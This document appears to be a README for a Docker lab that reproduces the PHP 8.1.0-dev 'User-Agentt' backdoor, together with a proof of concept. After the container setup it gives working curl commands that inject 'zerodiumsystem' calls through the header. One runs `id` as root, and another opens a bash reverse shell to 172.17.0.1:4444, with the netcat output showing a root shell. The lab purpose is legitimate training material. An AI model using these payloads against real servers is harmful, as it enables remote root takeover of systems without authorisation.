# PHP 8.1.0-dev User-Agentt Backdoor Docker Lab & PoC
References:
- [PHP 8.1.0-dev User-Agentt Backdoor](https://github.com/vulhub/vulhub/tree/master/php/8.1-backdoor)
- [https://news-web.php.net/php.internals/113838](https://news-web.php.net/php.internals/113838)
- [https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d](https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d)
- [https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a](https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a)
- [HackTheBox - Knife (PHP 8.1.0-dev User-Agentt)](https://twseptian.github.io/hackthebox%20machine/htb-machine-knife/)

If you doesn't have `docker-compose`. First let's install `docker-compose` to your operating system.
```bash
$ sudo apt-get install docker-compose
```
Docker command to build dockerfile
```bash
$ docker-compose up -d
$ docker ps -a                                                                                                                                          
CONTAINER ID   IMAGE                     COMMAND                  CREATED          STATUS          PORTS                                   NAMES
4607c17c5b06   vulhub/php:8.1-backdoor   "php -S 0.0.0.0:80 -…"   11 minutes ago   Up 11 minutes   0.0.0.0:8080->80/tcp, :::8080->80/tcp   php-81-dev_web_1
```
runs the service at `http://youripaddress:8080` or `http://0.0.0.0:8080`

Command Injection
```bash
$ curl -H "User-Agentt: zerodiumsystem('id');" 'http://172.17.0.1:8080'
uid=0(root) gid=0(root) groups=0(root)

testing, hello world page
```
Remote Code Execution
```bash
$ curl -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'\");" 'http://127.0.0.1:8080'
```
Output
```bash
$ nc -lvnp 4444                                                                                 
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.18.0.2.
Ncat: Connection from 172.18.0.2:35820.
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@4607c17c5b06:/var/www/html# id
id
uid=0(root) gid=0(root) groups=0(root)
root@4607c17c5b06:/var/www/html# 
```
